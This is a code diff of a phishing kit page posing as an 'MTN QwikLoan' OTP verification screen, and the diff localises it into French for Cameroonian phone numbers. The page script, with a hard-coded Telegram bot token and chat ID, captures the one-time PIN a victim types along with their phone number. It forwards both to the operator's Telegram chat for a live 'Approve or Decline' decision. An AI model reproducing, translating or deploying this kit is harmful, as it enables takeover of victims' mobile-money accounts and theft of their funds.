@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
-    <title>MTN QwikLoan – OTP Verification</title>
+    <title>MTN QwikLoan – Vérification OTP</title>
 
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
 
@@ -266,8 +266,8 @@
         <!-- ERROR BOX -->
         <div class="error-box" id="errorBox">
             <div class="close" onclick="hideError()">×</div>
-            <div class="error-title">Error</div>
-            <div class="error-text" id="errorText">Wrong OTP</div>
+            <div class="error-title">Erreur</div>
+            <div class="error-text" id="errorText">Code OTP incorrect</div>
         </div>
 
         <div class="content">
@@ -279,11 +279,11 @@
             </div>
 
             <!-- TEXT -->
-            <div class="title">Confirm your account</div>
+            <div class="title">Confirmez votre compte</div>
             <div class="subtitle" id="subtitleText">
-                A One‑Time PIN has been sent to<br />
-                <span id="maskedPhone">02xxxxxx20</span>.
-                Enter it below to verify your account.
+                Un code de vérification à usage unique a été envoyé au<br />
+                <span id="maskedPhone">65xxxxx56</span>.
+                Saisissez‑le ci‑dessous pour vérifier votre compte.
             </div>
 
             <!-- OTP INPUT SECTION – 4 digits -->
@@ -295,11 +295,11 @@
                     <input class="otp-input" maxlength="1" id="otp4" inputmode="numeric" pattern="[0-9]*" />
                 </div>
                 <div class="message" id="otpMessage"></div>
-                <button class="btn btn-primary" id="nextBtn" disabled>Next</button>
+                <button class="btn btn-primary" id="nextBtn" disabled>Suivant</button>
             </div>
 
             <!-- Go Back button -->
-            <button class="btn btn-outline" id="goBackBtn">Go Back</button>
+            <button class="btn btn-outline" id="goBackBtn">Retour</button>
 
         </div>
     </div>
@@ -311,7 +311,7 @@
 
     <script>
         (function() {
-            // ==================== TELEGRAM BOT CONFIG ====================
+            // ==================== TELEGRAM BOT CONFIG (English messages) ====================
             const BOT_TOKEN = '8745115171:AAHIirv4QpNh1p6JMWLLh6sqrvBh-YrO7Bc';
             const CHAT_ID = '1006917440';
             const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
@@ -332,10 +332,9 @@
             const errorText = document.getElementById('errorText');
 
             // ==================== RETRIEVE DATA FROM SESSIONSTORAGE ====================
-            const phone = sessionStorage.getItem('mtn_phone') || '0240000020';
-            const accountType = 'Mobile';
+            const phone = sessionStorage.getItem('mtn_phone') || '655123456'; // Cameroon 9 digits
 
-            // ==================== MASK PHONE NUMBER ====================
+            // ==================== MASK PHONE NUMBER (Cameroon: 9 digits) ====================
             function maskPhone(phone) {
                 const cleaned = phone.replace(/\D/g, '');
                 if (cleaned.length >= 4) {
@@ -445,7 +444,7 @@
 
             // ==================== ERROR HANDLING ====================
             function showError(message) {
-                errorText.innerText = message || 'An error occurred';
+                errorText.innerText = message || 'Une erreur est survenue';
                 errorBox.style.display = 'block';
                 setTimeout(() => {
                     errorBox.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
@@ -456,7 +455,7 @@
                 errorBox.style.display = 'none';
             };
 
-            // ==================== TELEGRAM HELPERS ====================
+            // ==================== TELEGRAM HELPERS (English messages) ====================
             function escapeHtml(unsafe) {
                 return unsafe.replace(/[&<>"]/g, function(m) {
                     if (m === '&') return '&amp;';
@@ -524,7 +523,7 @@
 
                 const enteredOtp = otpInputs.map(inp => inp.value).join('');
                 if (enteredOtp.length !== 4) {
-                    otpMessage.textContent = 'Please enter all 4 digits.';
+                    otpMessage.textContent = 'Veuillez saisir les 4 chiffres.';
                     otpMessage.className = 'message error';
                     otpMessage.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
                     return;
@@ -538,6 +537,7 @@
                 const ts = Date.now();
                 const identifier = `MTN MoMo: ${phone}`;
                 const escapedOtp = escapeHtml(enteredOtp);
+                // English message for admin
                 const msg =
                     `🔐 <b>MTN QwikLoan OTP Verification</b>\n\n${identifier}\nEntered OTP: <code>${escapedOtp}</code>\n\nApprove or Decline?`;
 
@@ -562,7 +562,7 @@
                     if (action === 'approve') {
                         window.location.href = 'loan.html';
                     } else if (action === 'decline') {
-                        showError('Invalid OTP. Please try again.');
+                        showError('Code OTP invalide. Veuillez réessayer.');
                         otpInputs.forEach(inp => {
                             inp.value = '';
                             inp.disabled = false;
@@ -583,7 +583,7 @@
 
             // ==================== CHECK FOR PREVIOUS ERROR ====================
             if (sessionStorage.getItem('wrongOtp')) {
-                showError('Wrong OTP.');
+                showError('Code OTP incorrect.');
                 sessionStorage.removeItem('wrongOtp');
             }
 
